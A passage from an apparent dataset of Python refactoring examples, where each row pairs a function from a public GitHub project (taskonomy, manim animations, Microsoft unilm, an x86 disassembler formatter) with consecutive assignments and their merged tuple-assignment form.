        softmax_to_ab = tf.nn.convolution(targets, self.trans_kernel, 'SAME' )
        resized_target = tf.image.resize_images(softmax_to_ab, 
                resize_shape,
                method=tf.image.ResizeMethod.NEAREST_NEIGHBOR)
    
        return resized_target, resized_output","resize_shape = tf.stack([self.input_size[0], self.input_size[1]])
softmax_to_ab = tf.nn.convolution(decoder_output, self.trans_kernel, 'SAME')","resize_shape , softmax_to_ab  = tf.stack([self.input_size[0], self.input_size[1]]), tf.nn.convolution(decoder_output, self.trans_kernel, 'SAME')"
taskonomy,https://github.com/StanfordVL/taskonomy/tree/master/code/lib/models/encoder_decoder_softmax_colorization.py,SoftmaxED,colorized_image_from_softmax$58,"def colorized_image_from_softmax(self, targets, decoder_output):
        ''' Regenerate colorized image from softmax distribution for all colors

        Notes:
            This is a constant mapping from distribution to actual image

        Args:
            decoder_output: list of input images (scaled between -1 and 1) with the
                       dimensions specified in the cfg
        '''
        resize_shape = tf.stack([self.input_size[0],self.input_size[1]])
        softmax_to_ab = tf.nn.convolution(decoder_output, self.trans_kernel, 'SAME' )
        resized_output = tf.image.resize_images(softmax_to_ab, 
                resize_shape,
                method=tf.image.ResizeMethod.NEAREST_NEIGHBOR)

        softmax_to_ab = tf.nn.convolution(targets, self.trans_kernel, 'SAME' )
        resized_target = tf.image.resize_images(softmax_to_ab, 
                resize_shape,
                method=tf.image.ResizeMethod.NEAREST_NEIGHBOR)
    
        return resized_target, resized_output","resized_output = tf.image.resize_images(softmax_to_ab, resize_shape, method=tf.image.ResizeMethod.NEAREST_NEIGHBOR)
softmax_to_ab = tf.nn.convolution(targets, self.trans_kernel, 'SAME')","resized_output , softmax_to_ab  = tf.image.resize_images(softmax_to_ab, resize_shape, method=tf.image.ResizeMethod.NEAREST_NEIGHBOR), tf.nn.convolution(targets, self.trans_kernel, 'SAME')"
AnimationsWithManim,https://github.com/Elteoremadebeethoven/AnimationsWithManim/tree/master/English/extra/anim_into_up.py,ExamplePreSolution,construct$20,"def construct(self):
        triangle = Triangle()
        square = Square()
        frame = 1 / self.camera.frame_rate

        def update_triangle(mob, dt):
            if mob.get_x() < 3:
                mob.shift(RIGHT * frame)

        triangle.add_updater(update_triangle)
        anim1 = Write(triangle,run_time=1)
        anim2 = FadeIn(square,rate_func=there_and_back)
        self.add(triangle)
        turn_animation_into_updater(anim1)
        self.wait(0.4)
        self.add(square)
        turn_animation_into_updater(anim2, cycle=True)
        self.wait(3)","triangle = Triangle()
square = Square()
frame = 1 / self.camera.frame_rate","triangle , square , frame  = Triangle(), Square(), 1 / self.camera.frame_rate"
AnimationsWithManim,https://github.com/Elteoremadebeethoven/AnimationsWithManim/tree/master/English/extra/anim_into_up.py,ExamplePreSolution,construct$20,"def construct(self):
        triangle = Triangle()
        square = Square()
        frame = 1 / self.camera.frame_rate

        def update_triangle(mob, dt):
            if mob.get_x() < 3:
                mob.shift(RIGHT * frame)

        triangle.add_updater(update_triangle)
        anim1 = Write(triangle,run_time=1)
        anim2 = FadeIn(square,rate_func=there_and_back)
        self.add(triangle)
        turn_animation_into_updater(anim1)
        self.wait(0.4)
        self.add(square)
        turn_animation_into_updater(anim2, cycle=True)
        self.wait(3)","anim1 = Write(triangle, run_time=1)
anim2 = FadeIn(square, rate_func=there_and_back)","anim1 , anim2  = Write(triangle, run_time=1), FadeIn(square, rate_func=there_and_back)"
unilm,https://github.com/microsoft/unilm/tree/master/xtune/src/transformers/data/processors/xtreme.py,,xtreme_convert_examples_to_features$31,"def xtreme_convert_examples_to_features(
        examples,
        tokenizer,
        max_length=512,
        task=None,
        label_list=None,
        output_mode=None,
        pad_on_left=False,
        pad_token=0,
        pad_token_segment_id=0,
        mask_padding_with_zero=True,
        word_dropout_rate=0.0,
):
    """"""
    Loads a data file into a list of ``InputFeatures``

    Args:
        examples: List of ``InputExamples`` or ``tf.data.Dataset`` containing the examples.
        tokenizer: Instance of a tokenizer that will tokenize the examples
        max_length: Maximum example length
        task: GLUE task
        label_list: List of labels. Can be obtained from the processor using the ``processor.get_labels()`` method
        output_mode: String indicating the output mode. Either ``regression`` or ``classification``
        pad_on_left: If set to ``True``, the examples will be padded on the left rather than on the right (default)
        pad_token: Padding token
        pad_token_segment_id: The segment ID for the padding token (It is usually 0, but can vary such as for XLNet where it is 4)
        mask_padding_with_zero: If set to ``True``, the attention mask will be filled by ``1`` for actual values
            and by ``0`` for padded values. If set to ``False``, inverts it (``1`` for padded values, ``0`` for
            actual values)

    Returns:
        If the ``examples`` input is a ``tf.data.Dataset``, will return a ``tf.data.Dataset``
        containing the task-specific features. If the input is a list of ``InputExamples``, will return
        a list of task-specific ``InputFeatures`` which can be fed to the model.

    """"""
    is_tf_dataset = False
    if is_tf_available() and isinstance(examples, tf.data.Dataset):
        is_tf_dataset = True

    if task is not None:
        processor = xtreme_processors[task]()
        if label_list is None:
            label_list = processor.get_labels()
            logger.info(""Using label list %s for task %s"" % (label_list, task))
        if output_mode is None:
            output_mode = xtreme_output_modes[task]
            logger.info(""Using output mode %s for task %s"" % (output_mode, task))

    label_map = {label: i for i, label in enumerate(label_list)}

    features = []
    for (ex_index, example) in enumerate(examples):
        len_examples = 0
        if is_tf_dataset:
            example = processor.get_example_from_tensor_dict(example)
            example = processor.tfds_map(example)
            len_examples = tf.data.experimental.cardinality(examples)
        else:
            len_examples = len(examples)
        if ex_index % 10000 == 0:
            logger.info(""Writing example %d/%d"" % (ex_index, len_examples))

        inputs = tokenizer.encode_plus(example.text_a, example.text_b, add_special_tokens=True, max_length=max_length, word_dropout_rate=word_dropout_rate,)
        input_ids, token_type_ids = inputs[""input_ids""], inputs[""token_type_ids""]

        # The mask has 1 for real tokens and 0 for padding tokens. Only real
        # tokens are attended to.
        attention_mask = [1 if mask_padding_with_zero else 0] * len(input_ids)

        # Zero-pad up to the sequence length.
        padding_length = max_length - len(input_ids)
        if pad_on_left:
            input_ids = ([pad_token] * padding_length) + input_ids
            attention_mask = ([0 if mask_padding_with_zero else 1] * padding_length) + attention_mask
            token_type_ids = ([pad_token_segment_id] * padding_length) + token_type_ids
        else:
            input_ids = input_ids + ([pad_token] * padding_length)
            attention_mask = attention_mask + ([0 if mask_padding_with_zero else 1] * padding_length)
            token_type_ids = token_type_ids + ([pad_token_segment_id] * padding_length)

        assert len(input_ids) == max_length, ""Error with input length {} vs {}"".format(len(input_ids), max_length)
        assert len(attention_mask) == max_length, ""Error with input length {} vs {}"".format(
            len(attention_mask), max_length
        )
        assert len(token_type_ids) == max_length, ""Error with input length {} vs {}"".format(
            len(token_type_ids), max_length
        )

        if output_mode == ""classification"":
            label = label_map[example.label]
        elif output_mode == ""regression"":
            label = float(example.label)
        else:
            raise KeyError(output_mode)

        if ex_index < 5:
            logger.info(""*** Example ***"")
            logger.info(""guid: %s"" % (example.guid))
            logger.info(""text a: %s"" % (example.text_a))
            logger.info(""text b: %s"" % (example.text_b))
            logger.info(""input_ids: %s"" % "" "".join([str(x) for x in input_ids]))
            logger.info(""attention_mask: %s"" % "" "".join([str(x) for x in attention_mask]))
            logger.info(""token_type_ids: %s"" % "" "".join([str(x) for x in token_type_ids]))
            logger.info(""label: %s (id = %d)"" % (example.label, label))

        features.append(
            InputFeatures(
                input_ids=input_ids, attention_mask=attention_mask, token_type_ids=token_type_ids, label=label,
                guid=example.guid
            )
        )

    if is_tf_available() and is_tf_dataset:

        def gen():
            for ex in features:
                yield (
                    {
                        ""input_ids"": ex.input_ids,
                        ""attention_mask"": ex.attention_mask,
                        ""token_type_ids"": ex.token_type_ids,
                    },
                    ex.label,
                )

        return tf.data.Dataset.from_generator(
            gen,
            ({""input_ids"": tf.int32, ""attention_mask"": tf.int32, ""token_type_ids"": tf.int32}, tf.int64),
            (
                {
                    ""input_ids"": tf.TensorShape([None]),
                    ""attention_mask"": tf.TensorShape([None]),
                    ""token_type_ids"": tf.TensorShape([None]),
                },
                tf.TensorShape([]),
            ),
        )

    return features","label_map = {label: i for (i, label) in enumerate(label_list)}
features = []","label_map , features  = {label: i for (i, label) in enumerate(label_list)}, []"
unilm,https://github.com/microsoft/unilm/tree/master/xtune/src/transformers/data/processors/xtreme.py,,xtreme_convert_examples_to_features$31,"def xtreme_convert_examples_to_features(
        examples,
        tokenizer,
        max_length=512,
        task=None,
        label_list=None,
        output_mode=None,
        pad_on_left=False,
        pad_token=0,
        pad_token_segment_id=0,
        mask_padding_with_zero=True,
        word_dropout_rate=0.0,
):
    """"""
    Loads a data file into a list of ``InputFeatures``

    Args:
        examples: List of ``InputExamples`` or ``tf.data.Dataset`` containing the examples.
        tokenizer: Instance of a tokenizer that will tokenize the examples
        max_length: Maximum example length
        task: GLUE task
        label_list: List of labels. Can be obtained from the processor using the ``processor.get_labels()`` method
        output_mode: String indicating the output mode. Either ``regression`` or ``classification``
        pad_on_left: If set to ``True``, the examples will be padded on the left rather than on the right (default)
        pad_token: Padding token
        pad_token_segment_id: The segment ID for the padding token (It is usually 0, but can vary such as for XLNet where it is 4)
        mask_padding_with_zero: If set to ``True``, the attention mask will be filled by ``1`` for actual values
            and by ``0`` for padded values. If set to ``False``, inverts it (``1`` for padded values, ``0`` for
            actual values)

    Returns:
        If the ``examples`` input is a ``tf.data.Dataset``, will return a ``tf.data.Dataset``
        containing the task-specific features. If the input is a list of ``InputExamples``, will return
        a list of task-specific ``InputFeatures`` which can be fed to the model.

    """"""
    is_tf_dataset = False
    if is_tf_available() and isinstance(examples, tf.data.Dataset):
        is_tf_dataset = True

    if task is not None:
        processor = xtreme_processors[task]()
        if label_list is None:
            label_list = processor.get_labels()
            logger.info(""Using label list %s for task %s"" % (label_list, task))
        if output_mode is None:
            output_mode = xtreme_output_modes[task]
            logger.info(""Using output mode %s for task %s"" % (output_mode, task))

    label_map = {label: i for i, label in enumerate(label_list)}

    features = []
    for (ex_index, example) in enumerate(examples):
        len_examples = 0
        if is_tf_dataset:
            example = processor.get_example_from_tensor_dict(example)
            example = processor.tfds_map(example)
            len_examples = tf.data.experimental.cardinality(examples)
        else:
            len_examples = len(examples)
        if ex_index % 10000 == 0:
            logger.info(""Writing example %d/%d"" % (ex_index, len_examples))

        inputs = tokenizer.encode_plus(example.text_a, example.text_b, add_special_tokens=True, max_length=max_length, word_dropout_rate=word_dropout_rate,)
        input_ids, token_type_ids = inputs[""input_ids""], inputs[""token_type_ids""]

        # The mask has 1 for real tokens and 0 for padding tokens. Only real
        # tokens are attended to.
        attention_mask = [1 if mask_padding_with_zero else 0] * len(input_ids)

        # Zero-pad up to the sequence length.
        padding_length = max_length - len(input_ids)
        if pad_on_left:
            input_ids = ([pad_token] * padding_length) + input_ids
            attention_mask = ([0 if mask_padding_with_zero else 1] * padding_length) + attention_mask
            token_type_ids = ([pad_token_segment_id] * padding_length) + token_type_ids
        else:
            input_ids = input_ids + ([pad_token] * padding_length)
            attention_mask = attention_mask + ([0 if mask_padding_with_zero else 1] * padding_length)
            token_type_ids = token_type_ids + ([pad_token_segment_id] * padding_length)

        assert len(input_ids) == max_length, ""Error with input length {} vs {}"".format(len(input_ids), max_length)
        assert len(attention_mask) == max_length, ""Error with input length {} vs {}"".format(
            len(attention_mask), max_length
        )
        assert len(token_type_ids) == max_length, ""Error with input length {} vs {}"".format(
            len(token_type_ids), max_length
        )

        if output_mode == ""classification"":
            label = label_map[example.label]
        elif output_mode == ""regression"":
            label = float(example.label)
        else:
            raise KeyError(output_mode)

        if ex_index < 5:
            logger.info(""*** Example ***"")
            logger.info(""guid: %s"" % (example.guid))
            logger.info(""text a: %s"" % (example.text_a))
            logger.info(""text b: %s"" % (example.text_b))
            logger.info(""input_ids: %s"" % "" "".join([str(x) for x in input_ids]))
            logger.info(""attention_mask: %s"" % "" "".join([str(x) for x in attention_mask]))
            logger.info(""token_type_ids: %s"" % "" "".join([str(x) for x in token_type_ids]))
            logger.info(""label: %s (id = %d)"" % (example.label, label))

        features.append(
            InputFeatures(
                input_ids=input_ids, attention_mask=attention_mask, token_type_ids=token_type_ids, label=label,
                guid=example.guid
            )
        )

    if is_tf_available() and is_tf_dataset:

        def gen():
            for ex in features:
                yield (
                    {
                        ""input_ids"": ex.input_ids,
                        ""attention_mask"": ex.attention_mask,
                        ""token_type_ids"": ex.token_type_ids,
                    },
                    ex.label,
                )

        return tf.data.Dataset.from_generator(
            gen,
            ({""input_ids"": tf.int32, ""attention_mask"": tf.int32, ""token_type_ids"": tf.int32}, tf.int64),
            (
                {
                    ""input_ids"": tf.TensorShape([None]),
                    ""attention_mask"": tf.TensorShape([None]),
                    ""token_type_ids"": tf.TensorShape([None]),
                },
                tf.TensorShape([]),
            ),
        )

    return features","attention_mask = [1 if mask_padding_with_zero else 0] * len(input_ids)
padding_length = max_length - len(input_ids)","attention_mask , padding_length  = [1 if mask_padding_with_zero else 0] * len(input_ids), max_length - len(input_ids)"
unilm,https://github.com/microsoft/unilm/tree/master/xtune/src/transformers/data/processors/xtreme.py,,xtreme_convert_examples_to_features$31,"def xtreme_convert_examples_to_features(
        examples,
        tokenizer,
        max_length=512,
        task=None,
        label_list=None,
        output_mode=None,
        pad_on_left=False,
        pad_token=0,
        pad_token_segment_id=0,
        mask_padding_with_zero=True,
        word_dropout_rate=0.0,
):
    """"""
    Loads a data file into a list of ``InputFeatures``

    Args:
        examples: List of ``InputExamples`` or ``tf.data.Dataset`` containing the examples.
        tokenizer: Instance of a tokenizer that will tokenize the examples
        max_length: Maximum example length
        task: GLUE task
        label_list: List of labels. Can be obtained from the processor using the ``processor.get_labels()`` method
        output_mode: String indicating the output mode. Either ``regression`` or ``classification``
        pad_on_left: If set to ``True``, the examples will be padded on the left rather than on the right (default)
        pad_token: Padding token
        pad_token_segment_id: The segment ID for the padding token (It is usually 0, but can vary such as for XLNet where it is 4)
        mask_padding_with_zero: If set to ``True``, the attention mask will be filled by ``1`` for actual values
            and by ``0`` for padded values. If set to ``False``, inverts it (``1`` for padded values, ``0`` for
            actual values)

    Returns:
        If the ``examples`` input is a ``tf.data.Dataset``, will return a ``tf.data.Dataset``
        containing the task-specific features. If the input is a list of ``InputExamples``, will return
        a list of task-specific ``InputFeatures`` which can be fed to the model.

    """"""
    is_tf_dataset = False
    if is_tf_available() and isinstance(examples, tf.data.Dataset):
        is_tf_dataset = True

    if task is not None:
        processor = xtreme_processors[task]()
        if label_list is None:
            label_list = processor.get_labels()
            logger.info(""Using label list %s for task %s"" % (label_list, task))
        if output_mode is None:
            output_mode = xtreme_output_modes[task]
            logger.info(""Using output mode %s for task %s"" % (output_mode, task))

    label_map = {label: i for i, label in enumerate(label_list)}

    features = []
    for (ex_index, example) in enumerate(examples):
        len_examples = 0
        if is_tf_dataset:
            example = processor.get_example_from_tensor_dict(example)
            example = processor.tfds_map(example)
            len_examples = tf.data.experimental.cardinality(examples)
        else:
            len_examples = len(examples)
        if ex_index % 10000 == 0:
            logger.info(""Writing example %d/%d"" % (ex_index, len_examples))

        inputs = tokenizer.encode_plus(example.text_a, example.text_b, add_special_tokens=True, max_length=max_length, word_dropout_rate=word_dropout_rate,)
        input_ids, token_type_ids = inputs[""input_ids""], inputs[""token_type_ids""]

        # The mask has 1 for real tokens and 0 for padding tokens. Only real
        # tokens are attended to.
        attention_mask = [1 if mask_padding_with_zero else 0] * len(input_ids)

        # Zero-pad up to the sequence length.
        padding_length = max_length - len(input_ids)
        if pad_on_left:
            input_ids = ([pad_token] * padding_length) + input_ids
            attention_mask = ([0 if mask_padding_with_zero else 1] * padding_length) + attention_mask
            token_type_ids = ([pad_token_segment_id] * padding_length) + token_type_ids
        else:
            input_ids = input_ids + ([pad_token] * padding_length)
            attention_mask = attention_mask + ([0 if mask_padding_with_zero else 1] * padding_length)
            token_type_ids = token_type_ids + ([pad_token_segment_id] * padding_length)

        assert len(input_ids) == max_length, ""Error with input length {} vs {}"".format(len(input_ids), max_length)
        assert len(attention_mask) == max_length, ""Error with input length {} vs {}"".format(
            len(attention_mask), max_length
        )
        assert len(token_type_ids) == max_length, ""Error with input length {} vs {}"".format(
            len(token_type_ids), max_length
        )

        if output_mode == ""classification"":
            label = label_map[example.label]
        elif output_mode == ""regression"":
            label = float(example.label)
        else:
            raise KeyError(output_mode)

        if ex_index < 5:
            logger.info(""*** Example ***"")
            logger.info(""guid: %s"" % (example.guid))
            logger.info(""text a: %s"" % (example.text_a))
            logger.info(""text b: %s"" % (example.text_b))
            logger.info(""input_ids: %s"" % "" "".join([str(x) for x in input_ids]))
            logger.info(""attention_mask: %s"" % "" "".join([str(x) for x in attention_mask]))
            logger.info(""token_type_ids: %s"" % "" "".join([str(x) for x in token_type_ids]))
            logger.info(""label: %s (id = %d)"" % (example.label, label))

        features.append(
            InputFeatures(
                input_ids=input_ids, attention_mask=attention_mask, token_type_ids=token_type_ids, label=label,
                guid=example.guid
            )
        )

    if is_tf_available() and is_tf_dataset:

        def gen():
            for ex in features:
                yield (
                    {
                        ""input_ids"": ex.input_ids,
                        ""attention_mask"": ex.attention_mask,
                        ""token_type_ids"": ex.token_type_ids,
                    },
                    ex.label,
                )

        return tf.data.Dataset.from_generator(
            gen,
            ({""input_ids"": tf.int32, ""attention_mask"": tf.int32, ""token_type_ids"": tf.int32}, tf.int64),
            (
                {
                    ""input_ids"": tf.TensorShape([None]),
                    ""attention_mask"": tf.TensorShape([None]),
                    ""token_type_ids"": tf.TensorShape([None]),
                },
                tf.TensorShape([]),
            ),
        )

    return features","example = processor.tfds_map(example)
len_examples = tf.data.experimental.cardinality(examples)","example , len_examples  = processor.tfds_map(example), tf.data.experimental.cardinality(examples)"
unilm,https://github.com/microsoft/unilm/tree/master/xtune/src/transformers/data/processors/xtreme.py,,xtreme_convert_examples_to_features$31,"def xtreme_convert_examples_to_features(
        examples,
        tokenizer,
        max_length=512,
        task=None,
        label_list=None,
        output_mode=None,
        pad_on_left=False,
        pad_token=0,
        pad_token_segment_id=0,
        mask_padding_with_zero=True,
        word_dropout_rate=0.0,
):
    """"""
    Loads a data file into a list of ``InputFeatures``

    Args:
        examples: List of ``InputExamples`` or ``tf.data.Dataset`` containing the examples.
        tokenizer: Instance of a tokenizer that will tokenize the examples
        max_length: Maximum example length
        task: GLUE task
        label_list: List of labels. Can be obtained from the processor using the ``processor.get_labels()`` method
        output_mode: String indicating the output mode. Either ``regression`` or ``classification``
        pad_on_left: If set to ``True``, the examples will be padded on the left rather than on the right (default)
        pad_token: Padding token
        pad_token_segment_id: The segment ID for the padding token (It is usually 0, but can vary such as for XLNet where it is 4)
        mask_padding_with_zero: If set to ``True``, the attention mask will be filled by ``1`` for actual values
            and by ``0`` for padded values. If set to ``False``, inverts it (``1`` for padded values, ``0`` for
            actual values)

    Returns:
        If the ``examples`` input is a ``tf.data.Dataset``, will return a ``tf.data.Dataset``
        containing the task-specific features. If the input is a list of ``InputExamples``, will return
        a list of task-specific ``InputFeatures`` which can be fed to the model.

    """"""
    is_tf_dataset = False
    if is_tf_available() and isinstance(examples, tf.data.Dataset):
        is_tf_dataset = True

    if task is not None:
        processor = xtreme_processors[task]()
        if label_list is None:
            label_list = processor.get_labels()
            logger.info(""Using label list %s for task %s"" % (label_list, task))
        if output_mode is None:
            output_mode = xtreme_output_modes[task]
            logger.info(""Using output mode %s for task %s"" % (output_mode, task))

    label_map = {label: i for i, label in enumerate(label_list)}

    features = []
    for (ex_index, example) in enumerate(examples):
        len_examples = 0
        if is_tf_dataset:
            example = processor.get_example_from_tensor_dict(example)
            example = processor.tfds_map(example)
            len_examples = tf.data.experimental.cardinality(examples)
        else:
            len_examples = len(examples)
        if ex_index % 10000 == 0:
            logger.info(""Writing example %d/%d"" % (ex_index, len_examples))

        inputs = tokenizer.encode_plus(example.text_a, example.text_b, add_special_tokens=True, max_length=max_length, word_dropout_rate=word_dropout_rate,)
        input_ids, token_type_ids = inputs[""input_ids""], inputs[""token_type_ids""]

        # The mask has 1 for real tokens and 0 for padding tokens. Only real
        # tokens are attended to.
        attention_mask = [1 if mask_padding_with_zero else 0] * len(input_ids)

        # Zero-pad up to the sequence length.
        padding_length = max_length - len(input_ids)
        if pad_on_left:
            input_ids = ([pad_token] * padding_length) + input_ids
            attention_mask = ([0 if mask_padding_with_zero else 1] * padding_length) + attention_mask
            token_type_ids = ([pad_token_segment_id] * padding_length) + token_type_ids
        else:
            input_ids = input_ids + ([pad_token] * padding_length)
            attention_mask = attention_mask + ([0 if mask_padding_with_zero else 1] * padding_length)
            token_type_ids = token_type_ids + ([pad_token_segment_id] * padding_length)

        assert len(input_ids) == max_length, ""Error with input length {} vs {}"".format(len(input_ids), max_length)
        assert len(attention_mask) == max_length, ""Error with input length {} vs {}"".format(
            len(attention_mask), max_length
        )
        assert len(token_type_ids) == max_length, ""Error with input length {} vs {}"".format(
            len(token_type_ids), max_length
        )

        if output_mode == ""classification"":
            label = label_map[example.label]
        elif output_mode == ""regression"":
            label = float(example.label)
        else:
            raise KeyError(output_mode)

        if ex_index < 5:
            logger.info(""*** Example ***"")
            logger.info(""guid: %s"" % (example.guid))
            logger.info(""text a: %s"" % (example.text_a))
            logger.info(""text b: %s"" % (example.text_b))
            logger.info(""input_ids: %s"" % "" "".join([str(x) for x in input_ids]))
            logger.info(""attention_mask: %s"" % "" "".join([str(x) for x in attention_mask]))
            logger.info(""token_type_ids: %s"" % "" "".join([str(x) for x in token_type_ids]))
            logger.info(""label: %s (id = %d)"" % (example.label, label))

        features.append(
            InputFeatures(
                input_ids=input_ids, attention_mask=attention_mask, token_type_ids=token_type_ids, label=label,
                guid=example.guid
            )
        )

    if is_tf_available() and is_tf_dataset:

        def gen():
            for ex in features:
                yield (
                    {
                        ""input_ids"": ex.input_ids,
                        ""attention_mask"": ex.attention_mask,
                        ""token_type_ids"": ex.token_type_ids,
                    },
                    ex.label,
                )

        return tf.data.Dataset.from_generator(
            gen,
            ({""input_ids"": tf.int32, ""attention_mask"": tf.int32, ""token_type_ids"": tf.int32}, tf.int64),
            (
                {
                    ""input_ids"": tf.TensorShape([None]),
                    ""attention_mask"": tf.TensorShape([None]),
                    ""token_type_ids"": tf.TensorShape([None]),
                },
                tf.TensorShape([]),
            ),
        )

    return features","input_ids = [pad_token] * padding_length + input_ids
attention_mask = [0 if mask_padding_with_zero else 1] * padding_length + attention_mask
token_type_ids = [pad_token_segment_id] * padding_length + token_type_ids","input_ids , attention_mask , token_type_ids  = [pad_token] * padding_length + input_ids, [0 if mask_padding_with_zero else 1] * padding_length + attention_mask, [pad_token_segment_id] * padding_length + token_type_ids"
deprecated-binaryninja-python,https://github.com/Vector35/deprecated-binaryninja-python/tree/master//Analysis.py,X86Instruction,format_text$82,"def format_text(self, block, options):
		old_lines = []
		old_tokens = []
		self.text.lines = []
		self.text.tokens = []

		line = []
		tokens = []
		x = 0
		instr = self.disasm

		if ""address"" in options:
			string = ""%.8x   "" % self.addr
			line += [[string, QColor(0, 0, 128)]]
			x += len(string)

		if instr.operation == None:
			line += [[""??"", Qt.black]]
			self.text.lines += [line]
			self.text.tokens += [tokens]
			return (old_lines != self.text.lines) or (old_tokens != self.text.tokens)

		result = """"
		operation = """"
		if instr.flags & X86.FLAG_LOCK:
			operation += ""lock ""
		if instr.flags & X86.FLAG_ANY_REP:
			operation += ""rep""
			if instr.flags & X86.FLAG_REPNE:
				operation += ""ne""
			elif instr.flags & X86.FLAG_REPE:
				operation += ""e""
			operation += "" ""
		operation += instr.operation
		if len(operation) < 7:
			operation += "" "" * (7 - len(operation))
		result += operation + "" ""

		for j in range(0, len(instr.operands)):
			if j != 0:
				result += "", ""
			if instr.operands[j].operand == ""imm"":
				value = instr.operands[j].immediate & ((1 << (instr.operands[j].size * 8)) - 1)
				numfmt = ""0x%%.%dx"" % (instr.operands[j].size * 2)
				string = numfmt % value
				if (instr.operands[j].size == self.addr_size) and (block.analysis.functions.has_key(value)):
					# Pointer to existing function
					func = block.analysis.functions[value]
					string = func.name
					if func.plt:
						color = QColor(192, 0, 192)
					else:
						color = QColor(0, 0, 192)
					if len(result) > 0:
						line += [[result, Qt.black]]
						x += len(result)
						result = """"
					line += [[string, color]]
					tokens += [[x, len(string), ""ptr"", value, string]]
					x += len(string)
				elif (instr.operands[j].size == self.addr_size) and (value >= block.exe.start()) and (value < block.exe.end()) and (not self.isLocalJump()):
					# Pointer within module
					if len(result) > 0:
						line += [[result, Qt.black]]
						x += len(result)
						result = """"
					if value in block.exe.symbols_by_addr:
						string = block.exe.symbols_by_addr[value]
					line += [[string, QColor(0, 0, 192)]]
					tokens += [[x, len(string), ""ptr"", value, string]]
					x += len(string)
				else:
					result += string
			elif instr.operands[j].operand == ""mem"":
				plus = False
				result += X86.get_size_string(instr.operands[j].size)
				if (instr.segment != None) or (instr.operands[j].segment == ""es""):
					result += instr.operands[j].segment + "":""
				result += '['
				if instr.operands[j].components[0] != None:
					tokens += [[x + len(result), len(instr.operands[j].components[0]), ""reg"", instr.operands[j].components[0]]]
					result += instr.operands[j].components[0]
					plus = True
				if instr.operands[j].components[1] != None:
					if plus:
						tokens += [[x + len(result) + 1, len(instr.operands[j].components[1]), ""reg"", instr.operands[j].components[1]]]
					else:
						tokens += [[x + len(result), len(instr.operands[j].components[1]), ""reg"", instr.operands[j].components[1]]]
					result += X86.get_operand_string(instr.operands[j].components[1],
						instr.operands[j].scale, plus)
					plus = True
				if (instr.operands[j].immediate != 0) or ((instr.operands[j].components[0] == None) and (instr.operands[j].components[1] == None)):
					if plus and (instr.operands[j].immediate >= -0x80) and (instr.operands[j].immediate < 0):
						result += '-'
						result += ""0x%.2x"" % (-instr.operands[j].immediate)
					elif plus and (instr.operands[j].immediate > 0) and (instr.operands[j].immediate <= 0x7f):
						result += '+'
						result += ""0x%.2x"" % instr.operands[j].immediate
					elif plus and (instr.operands[j].immediate >= -0x8000) and (instr.operands[j].immediate < 0):
						result += '-'
						result += ""0x%.8x"" % (-instr.operands[j].immediate)
					elif instr.flags & X86.FLAG_64BIT_ADDRESS:
						if plus:
							result += '+'
						value = instr.operands[j].immediate
						string = ""0x%.16x"" % instr.operands[j].immediate
						if hasattr(block.exe, ""plt"") and block.exe.plt.has_key(value):
							# Pointer to PLT entry
							self.plt = block.exe.plt[value]
							if len(result) > 0:
								line += [[result, Qt.black]]
								x += len(result)
								result = """"
							string = self.plt + ""@PLT""
							line += [[string, QColor(0, 0, 192)]]
							tokens += [[x, len(string), ""ptr"", value, string]]
							x += len(string)
						elif (value >= block.exe.start()) and (value < block.exe.end()):
							# Pointer within module
							if len(result) > 0:
								line += [[result, Qt.black]]
								x += len(result)
								result = """"
							if value in block.exe.symbols_by_addr:
								string = block.exe.symbols_by_addr[value]
							line += [[string, QColor(0, 0, 192)]]
							tokens += [[x, len(string), ""ptr"", value, string]]
							x += len(string)
						else:
							result += string
					else:
						if plus:
							result += '+'
						value = instr.operands[j].immediate & 0xffffffff
						string = ""0x%.8x"" % value
						if (self.addr_size == 4) and hasattr(block.exe, ""plt"") and block.exe.plt.has_key(value):
							# Pointer to PLT entry
							self.plt = block.exe.plt[value]
							if len(result) > 0:
								line += [[result, Qt.black]]
								x += len(result)
								result = """"
							string = block.exe.decorate_plt_name(self.plt)
							line += [[string, QColor(0, 0, 192)]]
							tokens += [[x, len(string), ""ptr"", value, string]]
							x += len(string)
						elif (self.addr_size == 4) and (value >= block.exe.start()) and (value < block.exe.end()):
							# Pointer within module
							if len(result) > 0:
								line += [[result, Qt.black]]
								x += len(result)
								result = """"
							if value in block.exe.symbols_by_addr:
								string = block.exe.symbols_by_addr[value]
							line += [[string, QColor(0, 0, 192)]]
							tokens += [[x, len(string), ""ptr"", value, string]]
							x += len(string)
						else:
							result += string
				result += ']'
			else:
				tokens += [[x + len(result), len(instr.operands[j].operand), ""reg"", instr.operands[j].operand]]
				result += instr.operands[j].operand

		if len(result) > 0:
			line += [[result, Qt.black]]
		self.text.lines += [line]
		self.text.tokens += [tokens]

		return (old_lines != self.text.lines) or (old_tokens != self.text.tokens)","old_lines = []
old_tokens = []
self.text.lines = []
self.text.tokens = []
line = []
tokens = []
x = 0
instr = self.disasm","old_lines , old_tokens , self.text.lines , self.text.tokens , line , tokens , x , instr  = [], [], [], [], [], [], 0, self.disasm"
deprecated-binaryninja-python,https://github.com/Vector35/deprecated-binaryninja-python/tree/master//Analysis.py,X86Instruction,format_text$82,"def format_text(self, block, options):
		old_lines = []
		old_tokens = []
		self.text.lines = []
		self.text.tokens = []

		line = []
		tokens = []
		x = 0
		instr = self.disasm

		if ""address"" in options:
			string = ""%.8x   "" % self.addr
			line += [[string, QColor(0, 0, 128)]]
			x += len(string)

		if instr.operation == None:
			line += [[""??"", Qt.black]]
			self.text.lines += [line]
			self.text.tokens += [tokens]
			return (old_lines != self.text.lines) or (old_tokens != self.text.tokens)

		result = """"
		operation = """"
		if instr.flags & X86.FLAG_LOCK:
			operation += ""lock ""
		if instr.flags & X86.FLAG_ANY_REP:
			operation += ""rep""
			if instr.flags & X86.FLAG_REPNE:
				operation += ""ne""
			elif instr.flags & X86.FLAG_REPE:
				operation += ""e""
			operation += "" ""
		operation += instr.operation
		if len(operation) < 7:
			operation += "" "" * (7 - len(operation))
		result += operation + "" ""

		for j in range(0, len(instr.operands)):
			if j != 0:
				result += "", ""
			if instr.operands[j].operand == ""imm"":
				value = instr.operands[j].immediate & ((1 << (instr.operands[j].size * 8)) - 1)
				numfmt = ""0x%%.%dx"" % (instr.operands[j].size * 2)
				string = numfmt % value
				if (instr.operands[j].size == self.addr_size) and (block.analysis.functions.has_key(value)):
					# Pointer to existing function
					func = block.analysis.functions[value]
					string = func.name
					if func.plt:
						color = QColor(192, 0, 192)
					else:
						color = QColor(0, 0, 192)
					if len(result) > 0:
						line += [[result, Qt.black]]
						x += len(result)
						result = """"
					line += [[string, color]]
					tokens += [[x, len(string), ""ptr"", value, string]]
